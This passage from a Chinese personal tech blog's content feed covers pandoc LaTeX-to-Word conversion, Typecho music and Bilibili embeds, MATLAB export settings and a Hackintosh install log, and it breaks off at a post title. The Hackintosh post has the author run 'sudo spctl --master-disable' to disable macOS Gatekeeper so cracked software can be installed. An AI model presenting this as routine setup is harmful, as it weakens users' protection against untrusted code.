class="line">print(files)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 循环转</span></span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">    migrate_single_file(file)</span><br></pre></td></tr></table></figure><p>需要注意的有几点：</p><ul><li><p><code>file_content = file_content.replace(r&#39;&#39;,&#39;&#39;)</code> 这行代码是因为我在导出markdown文件时，额外增添了``字符串，所以我把它删除了，自行决定需不需要删除</p></li><li><p>配置json:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data = &#123;<span class="string">&#x27;token&#x27;</span>:<span class="string">&#x27;xxxx&#x27;</span>,<span class="comment"># 写你的token</span></span><br><span class="line">           <span class="string">&#x27;sync&#x27;</span>:<span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;src&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;v&#x27;</span>:<span class="string">&#x27;2&#x27;</span></span><br><span class="line">           &#125;</span><br></pre></td></tr></table></figure><p>修改token为你的token。</p></li><li><p>配置迁移目录：<code>DIR = r&#39;C:\Users\Raven\Desktop\blog\blog&#39;</code> 也就是你现在放置Markdown文件的目录。</p></li></ul><p>迁移后的文档默认为源文档名后加后缀<code>_new</code>，如源文档<code>test_md.md</code>迁移后的文档名为<code>test_new.md</code>。</p><p>ok，就酱了。两天迁移了两次图床，心塞。</p>]]></content>
      
      
      <categories>
          
          <category> 杂文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 图床 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>将latex书写的公式转为word可用公式</title>
      <link href="/archives/dd4a0f03.html"/>
      <url>/archives/dd4a0f03.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-前文"><a href="#1-前文" class="headerlink" title="1. 前文"></a>1. 前文</h2><p>word公式编辑一般有3种：</p><ol><li><p>MathType 软件，这是最常用的，但是我并不喜欢用鼠标去点上标下标等，而且MathType所插入的公式并不好看。</p></li><li><p>高版本的Word自带的公式标记，如下图，这个兼容性很好，而且也很漂亮，但书写起来不方便<br><img data-src="https://pic1.superbed.cn/item/5cfbaced451253d178d94696.png"></p></li><li><p>插图，用图代表公式。</p></li></ol><p>本文的方法就是利用pandoc转为情况2下的公式，和word完美兼容。<br>另外，如果你要写的公式不多，其实完全没必要使用这种方法，因为反而绕了路。本文的方式只适合公式特别多的情况。</p><a id="more"></a><h2 id="2-正文"><a href="#2-正文" class="headerlink" title="2. 正文"></a>2. 正文</h2><h3 id="2-1-准备材料"><a href="#2-1-准备材料" class="headerlink" title="2.1 准备材料"></a>2.1 准备材料</h3><ol><li><span class="exturl" data-url="aHR0cDovL3R1Zy5vcmcvdGV4bGl2ZS8=" title="http://tug.org/texlive/">texlive<i class="fa fa-external-link"></i></span> 安装包 – 要编写latex总得要有编译环境吧。</li><li><span class="exturl" data-url="aHR0cDovL3RleHN0dWRpby5zb3VyY2Vmb3JnZS5uZXQv" title="http://texstudio.sourceforge.net/">texstudi<i class="fa fa-external-link"></i></span>o – 个人认为最好用的latex编辑器。笔者曾尝试过<ol><li>Atom自搭建</li><li>texwork</li></ol></li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cucGFuZG9jLm9yZy9pbnN0YWxsaW5nLmh0bWw=" title="https://www.pandoc.org/installing.html">pandoc<i class="fa fa-external-link"></i></span>  – 将ltex文件转为word文档工具，当然这个工具不止可以转换到word识别文件</li><li>office 2016及其以上套件（2013版我没测试，2010肯定不行）</li></ol><p><strong>上述材料依次安装</strong>（除了office），否则可能造成命令缺失，无法编译运行。</p><h3 id="2-2-Demo"><a href="#2-2-Demo" class="headerlink" title="2.2 Demo"></a>2.2 Demo</h3><p>在使用之前请把编译器设置为xelatex, 设置方式为:</p><p><img data-src="https://pic2.superbed.cn/item/5cfbacef451253d178d946cb.png"></p><p>好，现在正式开始:</p><ol><li>建立以下两个文件：</li></ol><p><img data-src="https://pic.superbed.cn/item/5cfbacf0451253d178d9471d.png"></p><p>   第一个文件是latex编译所需要用到的文件。</p><p>   第二文件则是待会从tex中得到的文件。</p><ol start="2"><li><p>现在开始写点latex代码吧，代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">\documentclass&#123;article&#125;</span><br><span class="line">\usepackage&#123;xeCJK&#125;% 中文支持</span><br><span class="line">\usepackage&#123;amsmath&#125;% 一些高级数学宏包</span><br><span class="line"></span><br><span class="line">\begin&#123;document&#125;</span><br><span class="line">% 随便写点公式</span><br><span class="line">\[</span><br><span class="line">a+b &#x3D; c</span><br><span class="line">\]</span><br><span class="line"></span><br><span class="line">\[</span><br><span class="line">\int_&#123;0&#125;^&#123;1&#125; xdx &#x3D; \frac&#123;1&#125;&#123;2&#125; </span><br><span class="line">\]</span><br><span class="line"></span><br><span class="line">% 公式中含有中文</span><br><span class="line">\[</span><br><span class="line">\text&#123;张&#125;a+\text&#123;张&#125;b &#x3D; \text&#123;张&#125;c</span><br><span class="line">\]</span><br><span class="line">\end&#123;document&#125;</span><br></pre></td></tr></table></figure><p>使用xelatex编译器编译后：</p><p>可以得到如下:</p><p><img data-src="https://pic.superbed.cn/item/5cfbacf2451253d178d94788.png"></p></li><li><p>可以看到对应生成的pdf还是相当漂亮的。现在我们把它转成word可用的docx文档。打开终端:</p><p><img data-src="https://pic.superbed.cn/item/5cfbacf3451253d178d947c8.png"></p></li></ol><ol start="4"><li><p>执行以下命令:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pandoc document.tex -o &quot;formula.docx&quot;</span><br></pre></td></tr></table></figure></li></ol><ol start="5"><li><p>现在在打开我们的”formula.docx”文档:</p><p><img data-src="https://pic1.superbed.cn/item/5cfbacf5451253d178d94802.png"></p></li></ol><p>生成的公式是完全和word兼容的。这个时候你就可以复制粘贴到你的文章中去了。</p><h3 id="2-3-添加些改造"><a href="#2-3-添加些改造" class="headerlink" title="2.3 添加些改造"></a>2.3 添加些改造</h3><p>每次都要敲命令是不是有点难受了？而且敲命令之前还要先关闭”formula.docx”这个文件，不然会提示文件已打开无法转换。 所以我们来搞个批运行代码，linux可以直接使用makefile+make命令，mac和linux一样，采用makefile。我们要实现的功能如下:</p><ol><li>能够自动关闭已经打开的”formula.docx”文档</li><li>能够自动编译刚新写的tex文档</li><li>编译完成后能够自动再打开”formula.docx”文档</li></ol><p>在和<code>document.tex</code>和<code>formula.docx</code>目录下新建一个<code>run.bat</code>文件，并用记事本打开，添加以下代码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">:: 生成公式脚本</span><br><span class="line">:: 关闭当前已打开的word公式文档</span><br><span class="line">taskkill -FI &quot;WINDOWTITLE eq formula.docx*&quot;</span><br><span class="line">:: 重新生成文档</span><br><span class="line">pandoc document.tex -o formula.docx</span><br><span class="line">:: 重新打开文档</span><br><span class="line">start &#x2F;b &quot;C:\Program Files (x86)\Microsoft Office\root\Office16\WINWORD.EXE&quot; formula.docx</span><br></pre></td></tr></table></figure><p>其中需要大家的修改的地方有一处，在最后一行的</p><p>C:\Program Files (x86)\Microsoft Office\root\Office16\WINWORD.EXE需要修改为你的word程序路径，这个路径怎么找，推荐使用everything这款软件，如下图:</p><p><img data-src="https://pic.superbed.cn/item/5cfbad00451253d178d948f7.png"></p><p>这样就可以找到了。</p><h3 id="2-4-视频Demo"><a href="#2-4-视频Demo" class="headerlink" title="2.4 视频Demo"></a>2.4 视频Demo</h3><p>我将上述操作流程（不包括安装）录了个视频发在了B站，有需要的朋友可以看一下。</p><iframe id="spkj"  src="//player.bilibili.com/player.html?aid=54188330&cid=94790979&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" width=100% allowfullscreen="true"> </iframe>!!!<script type="text/javascript">  document.getElementById("spkj").style.height=document.getElementById("spkj").scrollWidth*0.76+"px";</script>!!!<h2 id="3-latex写公式简单说明"><a href="#3-latex写公式简单说明" class="headerlink" title="3. latex写公式简单说明"></a>3. latex写公式简单说明</h2><p>还是看我们在2.2节中贴过的代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">\documentclass&#123;article&#125;</span><br><span class="line">\usepackage&#123;xeCJK&#125;% 中文支持</span><br><span class="line">\usepackage&#123;amsmath&#125;% 一些高级数学宏包</span><br><span class="line"></span><br><span class="line">\begin&#123;document&#125;</span><br><span class="line">% 随便写点公式</span><br><span class="line">\[</span><br><span class="line">a+b = c</span><br><span class="line">\]</span><br><span class="line"></span><br><span class="line">\[</span><br><span class="line">\int_&#123;<span class="number">0</span>&#125;^&#123;<span class="number">1</span>&#125; xdx = \frac&#123;<span class="number">1</span>&#125;&#123;<span class="number">2</span>&#125; </span><br><span class="line">\]</span><br><span class="line"></span><br><span class="line">% 公式中含有中文</span><br><span class="line">\[</span><br><span class="line">\text&#123;张&#125;a+\text&#123;张&#125;b = \text&#123;张&#125;c</span><br><span class="line">\]</span><br><span class="line">\end&#123;document&#125;</span><br></pre></td></tr></table></figure><p>我们一行行的分析。</p><ul><li><code>\documentclass&#123;article&#125;  </code> – 这是latex必备的一条指令，意思是本篇文章使用article模板，除了article以外，常用的还有report、book、ctexart等。一般来说我们只写公式的话，导入article即可。</li><li><code>\usepackage&#123;xeCJK&#125;</code> – article模板并不支持中文，\usepackage{xxx}是导入宏包的意思，通过宏包我们可以拓展文章的功能，xeCJK宏包用于支持中文。</li><li><code>usepackage&#123;amsmath&#125;</code> – amsmath是拓展数学宏包，一些高级的数学环境需要它的支持。</li><li>再看<code>\begin&#123;document&#125; -- \end&#123;document&#125;</code> ， 这就是我们文章的主体了，我们所有需要显示的内容都是在这里书写。</li></ul><p>如果你不懂上面说明的意思，只用记住这就是模板，你所需要的就是修改<code>\begin&#123;document&#125;</code> 到 <code>\end&#123;document&#125;</code>之间的内容。</p><p>再来说说latex里面如何书写公式。</p><p>latex公式中包括：行间公式和行内公式两种。什么意思呢。看下图就知道了。</p><p><img data-src="https://pic.superbed.cn/item/5cfbad02451253d178d94931.png"></p><p>书写行内公式的方式有两种:</p><p><img data-src="https://pic3.superbed.cn/item/5cfbad03451253d178d94962.png"></p><p>如图:</p><p><img data-src="https://pic.superbed.cn/item/5cfbad05451253d178d949a0.png"></p><p>数学行间公式的方式有多种，这里介绍常用的两种:</p><p><img data-src="https://pic.superbed.cn/item/5cfbad06451253d178d949e8.png"></p><p>如图:</p><p><img data-src="https://pic1.superbed.cn/item/5cfbad07451253d178d94a23.png"></p><p>注意一点，在数学模式中是无法写中文的，写了是不会显示出来。如：</p><p><img data-src="https://pic.superbed.cn/item/5cfbad09451253d178d94a5d.png"></p><p>正确的做法是用\text{}指令包围中文，如:</p><p><img data-src="https://pic.superbed.cn/item/5cfbad0a451253d178d94a93.png"></p><p>下面介绍一些常用的数学符号指令:</p><ul><li><p>求和 – \sum_{}^{}            _ 代表下表^代表上标</p></li><li><p>积分 – \int_{}^{}</p></li><li><p>无穷大 – \infty</p></li><li><p>小于等于 – \le</p></li><li><p>大于等于 – \ge</p></li><li><p>多个约束条件并用一个大括号括起来 :</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$$</span><br><span class="line">\left\&#123;</span><br><span class="line">             \begin&#123;array&#125;&#123;lr&#125;</span><br><span class="line">             x&#x3D;\dfrac&#123;3\pi&#125;&#123;2&#125;(1+2t)\cos(\dfrac&#123;3\pi&#125;&#123;2&#125;(1+2t)), &amp;  \\</span><br><span class="line">             y&#x3D;s, &amp; 0\leq s\leq L,|t|\leq1.\\</span><br><span class="line">             z&#x3D;\dfrac&#123;3\pi&#125;&#123;2&#125;(1+2t)\sin(\dfrac&#123;3\pi&#125;&#123;2&#125;(1+2t)), &amp;  </span><br><span class="line">             \end&#123;array&#125;</span><br><span class="line">\right.</span><br><span class="line">$$</span><br></pre></td></tr></table></figure><p>效果如图:</p><p><img data-src="https://pic.superbed.cn/item/5cfbad0c451253d178d94ae5.png"></p></li></ul><p>更多的公式可以从texstudio侧边栏找:</p><p><img data-src="https://pic2.superbed.cn/item/5cfbad0d451253d178d94b21.png"></p>]]></content>
      
      
      <categories>
          
          <category> 杂文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Latex </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在你的Typecho中插入音乐和视频（B站视频）</title>
      <link href="/archives/8db6abea.html"/>
      <url>/archives/8db6abea.html</url>
      
        <content type="html"><![CDATA[<h1 id="在你的Typecho中插入音乐和视频（B站视频）"><a href="#在你的Typecho中插入音乐和视频（B站视频）" class="headerlink" title="在你的Typecho中插入音乐和视频（B站视频）"></a>在你的Typecho中插入音乐和视频（B站视频）</h1><h2 id="1-插入音乐"><a href="#1-插入音乐" class="headerlink" title="1. 插入音乐"></a>1. 插入音乐</h2><p>插入音乐很简单，使用APlayer插件即可，链接如下：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL01vZVBsYXllci9BUGxheWVyLVR5cGVjaG8=" title="https://github.com/MoePlayer/APlayer-Typecho">https://github.com/MoePlayer/APlayer-Typecho<i class="fa fa-external-link"></i></span></p><a id="more"></a><p>安装方式很简单：</p><ol><li>在插件目录下clone上面的仓库</li><li>将名字更改为Meting</li><li>在Typecho插件中启用即可</li></ol><p>插入音乐Demo:<br>[Meting]<br>[Music server=”netease” id=”528484544” type=”song”/]<br>[/Meting]</p><p>可能要再刷新一下才能看到。</p><p>下面是本主题自带的音乐播放器。<br>[hplayer media=”netease” id=”528484544” type=”song” size=”large” auto=”true” /]</p><h2 id="2-插入B站视频"><a href="#2-插入B站视频" class="headerlink" title="2. 插入B站视频"></a>2. 插入B站视频</h2><p>其实插入视频也不算难，很多插件都支持插入各站视频，但是B站（个人喜欢B站一点，所以不考虑优酷、腾讯等）却不支持外链插入，所以我几乎把能找到的视频播放插件全试了一遍，均无果。尝试过的插件有:</p><ul><li>DPlayer</li><li>MyPlayer</li><li>Typembed</li><li>JWPlayer</li><li>Plyr</li></ul><p>后来从这篇文章里面发现了线索:<span class="exturl" data-url="aHR0cHM6Ly9mZW5neGlhby5tbC8yMDE4LzEyLzI3LzEzMy5odG1s" title="https://fengxiao.ml/2018/12/27/133.html">https://fengxiao.ml/2018/12/27/133.html<i class="fa fa-external-link"></i></span></p><p>具体操作如下，在你想要插入视频的地方插入一下代码:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">&quot;spkj&quot;</span> <span class="attr">src</span>=<span class="string">&quot;//player.bilibili.com/player.html?aid=43530152&amp;cid=76266554&amp;page=1&quot;</span> <span class="attr">scrolling</span>=<span class="string">&quot;no&quot;</span> <span class="attr">border</span>=<span class="string">&quot;0&quot;</span> <span class="attr">frameborder</span>=<span class="string">&quot;no&quot;</span> <span class="attr">framespacing</span>=<span class="string">&quot;0&quot;</span> <span class="attr">allowfullscreen</span>=<span class="string">&quot;true&quot;</span> <span class="attr">width</span>=<span class="string">100%</span>&gt;</span> <span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">!!!</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span>  </span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.getElementById(<span class="string">&quot;spkj&quot;</span>).style.height=<span class="built_in">document</span>.getElementById(<span class="string">&quot;spkj&quot;</span>).scrollWidth*<span class="number">0.76</span>+<span class="string">&quot;px&quot;</span>;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">!!!</span><br></pre></td></tr></table></figure><p>替换掉src=”xxxxxx”中间的选项为你的视频地址，地址可从下图中找到:</p><p><img data-src="https://pic.superbed.cn/item/5cfbae94451253d178d962ab.png"></p><p>最后展示下demo:</p><iframe id="spkj" src="//player.bilibili.com/player.html?aid=9155427&cid=15126301&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" width=100%> </iframe>!!!<script type="text/javascript">  document.getElementById("spkj").style.height=document.getElementById("spkj").scrollWidth*0.76+"px";</script>!!!<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><span class="exturl" data-url="aHR0cHM6Ly9hbG9uZTg4LmNuL2FyY2hpdmVzLzI2Lmh0bWw=" title="https://alone88.cn/archives/26.html">添加 Meting for Typecho 简单强大的在线音乐播放器<i class="fa fa-external-link"></i></span></p><p><span class="exturl" data-url="aHR0cHM6Ly9mZW5neGlhby5tbC8yMDE4LzEyLzI3LzEzMy5odG1s" title="https://fengxiao.ml/2018/12/27/133.html">博客中使用标签嵌入B站视频（其它视频同理）调整宽高的问题<i class="fa fa-external-link"></i></span></p>]]></content>
      
      
      <categories>
          
          <category> 博客搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Typecho </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决matlab导出图片不清晰的方法</title>
      <link href="/archives/dbe95ce6.html"/>
      <url>/archives/dbe95ce6.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>今天在使用matlab绘图时发现导出的图片并不清晰，百度了一番，发现了两种解决方案。</p></blockquote><a id="more"></a><h2 id="方法一：通过编辑-gt-复制图片解决"><a href="#方法一：通过编辑-gt-复制图片解决" class="headerlink" title="方法一：通过编辑-&gt;复制图片解决"></a>方法一：通过编辑-&gt;复制图片解决</h2><p>如图：</p><p><img data-src="https://pic.superbed.cn/item/5cfbaea5451253d178d9641c.png"></p><p>缺点：不能直接导出图片文件</p><h2 id="方法二：设置渲染模式"><a href="#方法二：设置渲染模式" class="headerlink" title="方法二：设置渲染模式"></a>方法二：设置渲染模式</h2><p>这个方法对我来说没用。不过你可以试试。</p><p>Step1:打开图片导出设置：</p><p><img data-src="https://pic.superbed.cn/item/5cfbaea6451253d178d9644f.png"></p><p>Step2:  设置为矢量:</p><p><img data-src="https://pic.superbed.cn/item/5cfbaea8451253d178d9648b.png"></p>]]></content>
      
      
      <categories>
          
          <category> 杂文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> matlab </tag>
            
            <tag> 图片 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>黑苹果安装记录</title>
      <link href="/archives/b8634fa6.html"/>
      <url>/archives/b8634fa6.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2><blockquote><p>又是一次闲的无聊的折腾，想着去年有一次心血来潮安装黑苹果却没成功，最后在淘宝费了100多才安装的经历。最近正好忙完毕设，就来作作死，安装一波。<strong>这次文章也不是什么详细教程，主要是不想重搞一次来截图</strong>，只是简单记一下自己安装的经历吧，不过有想安装黑苹果的小伙伴也可以看看大体流程，特别是第4节说的安装后应该做的事。</p></blockquote><a id="more"></a><p>手上有Intel的笔记本和AMD的台式机，所以两台电脑都尝试过了，并且也都成功安装，下面分别简单说一下。</p><p>[Meting]<br>[Music server=”netease” id=”528484544” type=”song”/]<br>[/Meting]</p><h2 id="2-Intel笔记本篇"><a href="#2-Intel笔记本篇" class="headerlink" title="2. Intel笔记本篇"></a>2. Intel笔记本篇</h2><h3 id="2-1-材料准备"><a href="#2-1-材料准备" class="headerlink" title="2.1 材料准备"></a>2.1 材料准备</h3><p>Intel笔记本是几年前买的了，配置不行，所以闲着没怎么用，都说Intel的CPU好安装一点（实际从我的安装体验来看，用AMD的懒人包简单多了），那就从Intel笔记本入手了。准备了以下材料:</p><ol><li>Mac OS 10.13.4 系统镜像</li><li>TransMac刻录工具</li><li>DiskGenius磁盘管理工具</li><li>U盘8G以上</li><li><strong>EFI</strong> （这个是最重要的了，安装不了都是这个问题）</li><li>非必须，各种驱动（最好能备好有线网卡驱动，无线基本没法驱动的，所以无线就去淘宝花个20来软妹币买个无线网卡就ok，有网才能做后面的各种事情嘛）</li></ol><h3 id="2-2-刻录镜像"><a href="#2-2-刻录镜像" class="headerlink" title="2.2 刻录镜像"></a>2.2 刻录镜像</h3><p>安装好TransMac工具，并插入你的U盘。然后做以下两部：</p><p>step1: 格式化U盘（所以备份好你的U盘），根据提示写个U盘名字就ok~</p><p><img data-src="https://pic.superbed.cn/item/5cfbacbd451253d178d93fcf.png"></p><p>step2: 刻录mac系统，选择Restore with Disk Image，然后选中的镜像就好。</p><p><img data-src="https://pic.superbed.cn/item/5cfbacbe451253d178d9400b.png"></p><h3 id="2-3-划分Mac系统分区"><a href="#2-3-划分Mac系统分区" class="headerlink" title="2.3 划分Mac系统分区"></a>2.3 划分Mac系统分区</h3><p>刻录好系统后，咱们就需要分区了。一般来说有两种方案，一个是直接拿一整块干净硬盘来做黑苹果系统，另一个就是在目前已经有的磁盘分区上划分一部分出来做系统。两种方式都很简单，但是<strong>后期安装好后设置启动项略有区别。</strong></p><p>这里就不说明具体的划分分区的操作了，简单说来就是一整块硬盘直接新建一个卷不用格式化，划分新分区也是同理。建议分区大于30G。</p><h3 id="2-4-最重要的一步，替换EFI"><a href="#2-4-最重要的一步，替换EFI" class="headerlink" title="2.4 最重要的一步，替换EFI"></a>2.4 最重要的一步，替换EFI</h3><p>要替换EFI，首先要找到适合自己的EFI，我也是小白并不会自己配，所以就在网上找现成的，最后发现了这个网站：<span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3Mvb1lJck5PeThDby1TYktUUGxHT2xMdw==" title="https://mp.weixin.qq.com/s/oYIrNOy8Co-SbKTPlGOlLw">https://mp.weixin.qq.com/s/oYIrNOy8Co-SbKTPlGOlLw<i class="fa fa-external-link"></i></span> 的博主提供了不少EFI，虽然要5元付费（<strong>我没有打广告，你通过其他路径也可以，我也是说我成功安装的一个过程</strong>），下图是他的一个展示，值得注意一点的是，即使你付费了，他把百度云的密码给你，并且你也找到适合你的EFI下载后还需要他的一个解压密码，整个过程有点烦，不过他也是说的怕乱传播，我感觉有点繁琐就是了。</p><p><img data-src="https://pic.superbed.cn/item/5cfbacbf451253d178d9404e.png"></p><p>如果你找到了合适的EFI文件后，就需要对U盘中的EFI文件进行替换了。具体替换过程如下：</p><p>step1： 打开DiskGenius工具，进入如图目录。</p><p><img data-src="https://pic.superbed.cn/item/5cfbacc1451253d178d9409f.png"></p><p>step2: 直接把你下载的EFI文件复制粘贴过来，提示替换，选全部替换即可。</p><p>额外说明，下一步就要进行实际安装了，这里打开了DiskGenius，所以正好把你当前系统的EFI文件备份一下，避免安装过程中出错可能把本来系统的EFI文件损坏了。（本人有过类似经历，好在后来通过PE修复了），备份方式如下：</p><p><img data-src="https://pic.superbed.cn/item/5cfbacc2451253d178d940f5.png"></p><p>三星的硬盘是我的主硬盘，同样进入到EFI文件夹下，可以看到我安装了Windows和Ubuntu两个系统，把这个EFI分区复制到某个自己能识别的目录下，以便后期使用。</p><h3 id="2-5-正式安装"><a href="#2-5-正式安装" class="headerlink" title="2.5 正式安装"></a>2.5 正式安装</h3><p>step1: 关机进入BIOS，进行如下设置：</p><ul><li><p>SATA Ports = AHCI</p></li><li><p>IOMMU = Disabled</p></li><li><p>APU = Disabled</p></li><li><p>HPET = Enabled</p></li><li><p>EHCI Hands-off = Enabled</p></li><li><p>XHCI Hands-off = Enabled</p></li><li><p>Serial Port = Disabled</p></li><li><p>Parallel Port = Disabled</p></li></ul><p>step2:  设置U盘为第一启动项</p><p>step3: 重启，进入Clover启动，<strong>选择U盘安装MacOS</strong></p><p>step4: 进行安装界面，选择磁盘工具，抹除上述分区，分区文件系统选择<strong>APFS</strong></p><p>spte5:重回安装界面，进行安装，之后会自动关机</p><p>step6: 重启从U盘启动，进入到Clover，<strong>这次不选择从U盘安装MacOS</strong>，而是选择从硬盘中启动（反正就是选择除U盘的Apple标志的另外一个Apple标志），关机重启</p><p>step7: 还是以U盘启动，进入到Clover，这次依然选择从硬盘启动MacOS，之后应该就是正常设定。</p><h2 id="3-AMD台式机"><a href="#3-AMD台式机" class="headerlink" title="3. AMD台式机"></a>3. AMD台式机</h2><p>都说AMD装机要比Intel难，其实从我个人的安装体验来说，AMD安装简单多了，毕竟有懒人包。<br><img data-src="https://pic.superbed.cn/item/5cfbacc4451253d178d94145.jpg"></p><h3 id="3-1-配置说明"><a href="#3-1-配置说明" class="headerlink" title="3.1 配置说明"></a>3.1 配置说明</h3><ul><li><p>AMD 2600x</p></li><li><p>影驰：NVIDA 1060 </p></li><li><p>东芝家的SSD。本来想用主力的PM981的，但是从远景上得知PM981不能安装</p></li><li><p>主板 X470</p></li></ul><h3 id="3-2-安装过程"><a href="#3-2-安装过程" class="headerlink" title="3.2 安装过程"></a>3.2 安装过程</h3><p>step1: 下载<strong>聆曦AMD Ryzen黑苹果镜像</strong>，百度就行，有很多。<strong>不建议下载mojave_10.14.3版本的，因为N卡驱动还不支持，最后导致显示效果很垃圾</strong>。</p><p>step2: 刻录镜像、划分分区和上述过程一样，但是<strong>不用替换EFI</strong>。</p><p>step3: 设置BIOS的一些选项和Intel相同，在设置从U盘启动。</p><hr><p>下面的步骤就和Intel安装稍有不同了。</p><p>step4: 进入Clover，<strong>选择从U盘安装</strong>，进入以后，抹除分区，选择文件系统<strong>APFS</strong>，然后进行系统安装，重启。</p><p>step5: 重启进入Clover，<strong>选择从U盘安装</strong>，打开终端，输入<code>lingxi_one</code>，跑完代码后，重启。</p><p>step6: 重启进入Clover，<strong>选择从硬盘启动</strong>，然后就是漫长的安装系统过程，跑完后会自动重启。</p><p>step7: 重启进入Clover，<strong>选择从U盘安装</strong>，打开终端，输入<code>lingxi_two</code>，跑完代码后，重启。</p><p>step8: 重启进入Clover，<strong>选择从硬盘启动</strong>, 然后就能进入系统了。</p><h2 id="4-安装之后的事"><a href="#4-安装之后的事" class="headerlink" title="4. 安装之后的事"></a>4. 安装之后的事</h2><p>如果顺利安装好了，也别多高兴。这仅仅是折腾的第一步，黑苹果最难受的就是折腾驱动。这里给出后续需要做的几点工作。</p><p>进入系统的第一件事，打开终端，执行以下命令:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo spctl --master-disable </span><br></pre></td></tr></table></figure><p>上述命令是为了打开任意安装来源，不然无法安装一些破解软件。</p><p>必备的软件:</p><ol><li><p>clover configuration – 配置驱动，EFI必备</p></li><li><p>KCPMUtilityPro – 安装驱动必备</p></li><li><p>VoodooHDA.kext – 万能声卡驱动</p></li><li><p>VoodooPS2Controller.kext – 键盘和触摸板驱动</p></li><li><p>无线网卡几乎不能驱动，所以上淘宝花个20来RMB买个无线网卡吧。</p></li><li><p>NVIDA WebDriver – N卡驱动，记得找对应苹果系统版本的。</p><p>上述所有软件都可以在<strong>“黑苹果社区”</strong>网站找到。</p></li></ol><p>这里给两个视频教程。</p><p>视频教程1： AMD安装黑苹果教程</p><iframe id="spkj1" src="//player.bilibili.com/player.html?aid=41865008&cid=73505470&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" width=100%> </iframe><p>视频教程2: 安装N卡驱动教程，从7分20秒开始看：</p><iframe id="spkj2" src="//player.bilibili.com/player.html?aid=35160335&cid=61653453&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" width=100%> </iframe>!!!<script type="text/javascript">  document.getElementById("spkj1").style.height=document.getElementById("spkj1").scrollWidth*0.76+"px";</script>!!!!!!<script type="text/javascript">  document.getElementById("spkj2").style.height=document.getElementById("spkj2").scrollWidth*0.76+"px";</script>!!!<p>常用的软件：</p><ol><li>CleanMyMacXChinese4.4.0 – 清理软件</li><li>Paste – 剪贴板历史</li><li>ssr-mac – 禾斗xue上网</li></ol>]]></content>
      
      
      <categories>
          
          <category> 杂文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 黑苹果 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决Pandownload连接数限制为1的方法</title>
      <link href="/archives/d808500e.html"/>
      <url>/archives/d808500e.html</url>
      
